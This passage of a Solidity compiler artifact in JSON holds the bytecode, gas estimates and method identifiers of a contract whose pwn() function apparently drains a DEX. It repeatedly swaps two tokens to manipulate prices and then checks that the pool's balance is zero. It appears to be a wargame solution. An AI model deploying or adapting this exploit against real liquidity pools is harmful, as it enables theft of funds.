MLOAD SWAP1 POP PUSH2 0x26D DUP2 PUSH2 0x249 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x288 JUMPI PUSH2 0x287 PUSH2 0x1AF JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x295 DUP5 DUP3 DUP6 ADD PUSH2 0x25F JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH1 0xA0 MLOAD PUSH1 0xC0 MLOAD PUSH2 0xA82 PUSH2 0x34B PUSH0 CODECOPY PUSH0 DUP2 DUP2 PUSH1 0xD8 ADD MSTORE DUP2 DUP2 PUSH2 0x253 ADD MSTORE DUP2 DUP2 PUSH2 0x353 ADD MSTORE DUP2 DUP2 PUSH2 0x37C ADD MSTORE DUP2 DUP2 PUSH2 0x3E7 ADD MSTORE DUP2 DUP2 PUSH2 0x410 ADD MSTORE DUP2 DUP2 PUSH2 0x47B ADD MSTORE PUSH2 0x4DD ADD MSTORE PUSH0 DUP2 DUP2 PUSH1 0x39 ADD MSTORE DUP2 DUP2 PUSH2 0x177 ADD MSTORE DUP2 DUP2 PUSH2 0x332 ADD MSTORE DUP2 DUP2 PUSH2 0x39D ADD MSTORE DUP2 DUP2 PUSH2 0x3C6 ADD MSTORE DUP2 DUP2 PUSH2 0x431 ADD MSTORE DUP2 DUP2 PUSH2 0x45A ADD MSTORE DUP2 DUP2 PUSH2 0x4FE ADD MSTORE PUSH2 0x56D ADD MSTORE PUSH0 DUP2 DUP2 PUSH2 0x1B3 ADD MSTORE DUP2 DUP2 PUSH2 0x28F ADD MSTORE DUP2 DUP2 PUSH2 0x4A1 ADD MSTORE DUP2 DUP2 PUSH2 0x5A9 ADD MSTORE PUSH2 0x667 ADD MSTORE PUSH2 0xA82 PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xDD365B8B EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x35 PUSH2 0x37 JUMP JUMPDEST STOP JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD CALLER ADDRESS PUSH1 0xA PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x95 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x7F4 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xB1 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xD5 SWAP2 SWAP1 PUSH2 0x862 JUMP JUMPDEST POP PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD CALLER ADDRESS PUSH1 0xA PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x134 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x7F4 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x150 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x174 SWAP2 SWAP1 PUSH2 0x862 JUMP JUMPDEST POP PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x95EA7B3 PUSH32 0x0 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x210 SWAP3 SWAP2 SWAP1 PUSH2 0x89C JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x22C JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x250 SWAP2 SWAP1 PUSH2 0x862 JUMP JUMPDEST POP PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x95EA7B3 PUSH32 0x0 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2EC SWAP3 SWAP2 SWAP1 PUSH2 0x89C JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x308 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x32C SWAP2 SWAP1 PUSH2 0x862 JUMP JUMPDEST POP PUSH2 0x377 PUSH32 0x0 PUSH32 0x0 PUSH2 0x665 JUMP JUMPDEST PUSH2 0x3C1 PUSH32 0x0 PUSH32 0x0 PUSH2 0x665 JUMP JUMPDEST PUSH2 0x40B PUSH32 0x0 PUSH32 0x0 PUSH2 0x665 JUMP JUMPDEST PUSH2 0x455 PUSH32 0x0 PUSH32 0x0 PUSH2 0x665 JUMP JUMPDEST PUSH2 0x49F PUSH32 0x0 PUSH32 0x0 PUSH2 0x665 JUMP JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xDF791E50 PUSH32 0x0 PUSH32 0x0 PUSH1 0x2D PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x53D SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x8FC JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x554 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x566 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 PUSH32 0x0 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x5E4 SWAP2 SWAP1 PUSH2 0x931 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x5FF JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x623 SWAP2 SWAP1 PUSH2 0x974 JUMP JUMPDEST EQ PUSH2 0x663 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x65A SWAP1 PUSH2 0x9F9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xDF791E50 DUP4 DUP4 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x6DC SWAP2 SWAP1 PUSH2 0x931 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x6F7 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x71B SWAP2 SWAP1 PUSH2 0x974 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x739 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xA17 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x750 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x762 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x793 DUP3 PUSH2 0x76A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x7A3 DUP2 PUSH2 0x789 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x7DE PUSH2 0x7D9 PUSH2 0x7D4 DUP5 PUSH2 0x7A9 JUMP JUMPDEST PUSH2 0x7BB JUMP JUMPDEST PUSH2 0x7B2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x7EE DUP2 PUSH2 0x7C4 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x807 PUSH0 DUP4 ADD DUP7 PUSH2 0x79A JUMP JUMPDEST PUSH2 0x814 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x79A JUMP JUMPDEST PUSH2 0x821 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x7E5 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x841 DUP2 PUSH2 0x82D JUMP JUMPDEST DUP2 EQ PUSH2 0x84B JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x85C DUP2 PUSH2 0x838 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x877 JUMPI PUSH2 0x876 PUSH2 0x829 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x884 DUP5 DUP3 DUP6 ADD PUSH2 0x84E JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x896 DUP2 PUSH2 0x7B2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x8AF PUSH0 DUP4 ADD DUP6 PUSH2 0x79A JUMP JUMPDEST PUSH2 0x8BC PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x88D JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x8E6 PUSH2 0x8E1 PUSH2 0x8DC DUP5 PUSH2 0x8C3 JUMP JUMPDEST PUSH2 0x7BB JUMP JUMPDEST PUSH2 0x7B2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x8F6 DUP2 PUSH2 0x8CC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x90F PUSH0 DUP4 ADD DUP7 PUSH2 0x79A JUMP JUMPDEST PUSH2 0x91C PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x79A JUMP JUMPDEST PUSH2 0x929 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x8ED JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x944 PUSH0 DUP4 ADD DUP5 PUSH2 0x79A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x953 DUP2 PUSH2 0x7B2 JUMP JUMPDEST DUP2 EQ PUSH2 0x95D JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x96E DUP2 PUSH2 0x94A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x989 JUMPI PUSH2 0x988 PUSH2 0x829 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x996 DUP5 DUP3 DUP6 ADD PUSH2 0x960 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x6465782062616C616E636520213D203000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x9E3 PUSH1 0x10 DUP4 PUSH2 0x99F JUMP JUMPDEST SWAP2 POP PUSH2 0x9EE DUP3 PUSH2 0x9AF JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xA10 DUP2 PUSH2 0x9D7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0xA2A PUSH0 DUP4 ADD DUP7 PUSH2 0x79A JUMP JUMPDEST PUSH2 0xA37 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x79A JUMP JUMPDEST PUSH2 0xA44 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x88D JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC7 EXTCODECOPY 0x21 PUSH30 0x284A5C8F4B183DAA2E9F0DC37BC870697FC621220E8C3DCAEAB98FF06473 PUSH16 0x6C634300081B00330000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "538000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"pwn()": "infinite"
					},
					"internal": {
						"_swap(contract IERC20,contract IERC20)": "infinite"
					}
				},
				"methodIdentifiers": {
					"pwn()": "dd365b8b"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}